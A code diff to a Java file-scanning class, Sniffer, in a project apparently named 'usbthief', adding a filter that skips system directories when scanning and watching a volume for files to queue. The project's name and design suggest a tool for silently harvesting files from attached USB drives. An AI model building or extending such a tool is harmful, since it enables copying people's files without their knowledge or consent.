@@ -7,7 +7,9 @@ import com.superredrock.usbthief.core.QueueManager;
 import com.superredrock.usbthief.core.event.EventBus;
 import com.superredrock.usbthief.core.event.worker.FileDiscoveredEvent;
 import com.superredrock.usbthief.core.filter.BasicFileFilter;
+import com.superredrock.usbthief.core.filter.FileFilter;
 import com.superredrock.usbthief.core.filter.SuffixFilter;
+import com.superredrock.usbthief.core.filter.SystemDirectoryFilter;
 
 import java.io.Closeable;
 import java.io.IOException;
@@ -29,6 +31,7 @@ public class Sniffer extends Thread implements Closeable {
     private final WatchService monitor;
     private final Volume volume;
 
+    private final FileFilter systemDirFilter = new SystemDirectoryFilter();
     private final AtomicInteger changeCount = new AtomicInteger(0);
     private final ConcurrentHashMap<Path, WatchKey> watchKeys = new ConcurrentHashMap<>();
     private volatile boolean running = true;
@@ -39,9 +42,6 @@ public class Sniffer extends Thread implements Closeable {
     private final CompletableFuture<Void> completionFuture = new CompletableFuture<>();
 
     private static final ForkJoinPool scanPool = ForkJoinPool.commonPool();
-    static {
-        scanPool.setParallelism(16);
-    }
 
     /**
      * Creates a Sniffer for the given volume.
@@ -88,7 +88,7 @@ public class Sniffer extends Thread implements Closeable {
 
     private void performInitialScan() {
         logger.info("Scanning Disk {}", root);
-        BiPredicate<Path, BasicFileAttributes> fileFilter = new BasicFileFilter(ConfigManager.getInstance());
+        FileFilter fileFilter = new SystemDirectoryFilter().and(new BasicFileFilter(ConfigManager.getInstance()));
         SuffixFilter suffixFilter = new SuffixFilter(ConfigManager.getInstance());
         AtomicInteger fileCount = new AtomicInteger(0);
 
@@ -155,11 +155,22 @@ public class Sniffer extends Thread implements Closeable {
     }
 
     private void scanNewDirectory(Path dir) throws IOException {
+        // Skip system directories entirely — don't scan or watch
+        try {
+            BasicFileAttributes attrs = Files.readAttributes(dir, BasicFileAttributes.class);
+            if (!systemDirFilter.test(dir, attrs)) {
+                logger.debug("Skipping system directory: {}", dir);
+                return;
+            }
+        } catch (IOException e) {
+            return;
+        }
+
         registerDirectoryWatch(dir);
 
-        BiPredicate<Path, BasicFileAttributes> fileFilter = new BasicFileFilter(ConfigManager.getInstance());
+        FileFilter baseFilter = new SystemDirectoryFilter().and(new BasicFileFilter(ConfigManager.getInstance()));
         BiPredicate<Path, BasicFileAttributes> filter = (path, attrs) ->
-                attrs.isDirectory() || fileFilter.test(path, attrs);
+                attrs.isDirectory() || baseFilter.test(path, attrs);
         SuffixFilter suffixFilter = new SuffixFilter(ConfigManager.getInstance());
 
         try {
@@ -287,6 +298,8 @@ public class Sniffer extends Thread implements Closeable {
 
     private void handleChangedPath(Path path, WatchEvent.Kind<?> kind) {
         try {
+            if (isInsideSystemDirectory(path)) return;
+
             if (Files.isDirectory(path) && kind == StandardWatchEventKinds.ENTRY_CREATE) {
                 scanNewDirectory(path);
             } else if (Files.isRegularFile(path)) {
@@ -295,6 +308,19 @@ public class Sniffer extends Thread implements Closeable {
         } catch (IOException e) {
             logger.warn("Error handling changed path: ", e);
         }
+    }
+
+    private boolean isInsideSystemDirectory(Path path) {
+        for (Path p = path; p != null; p = p.getParent()) {
+            if (p.equals(root)) break;
+            Path name = p.getFileName();
+            if (name == null) continue;
+            try {
+                BasicFileAttributes attrs = Files.readAttributes(p, BasicFileAttributes.class);
+                if (!systemDirFilter.test(p, attrs)) return true;
+            } catch (IOException _) {}
+        }
+        return false;
     }
 
     private void registerDirectoryWatch(Path dir) throws IOException {
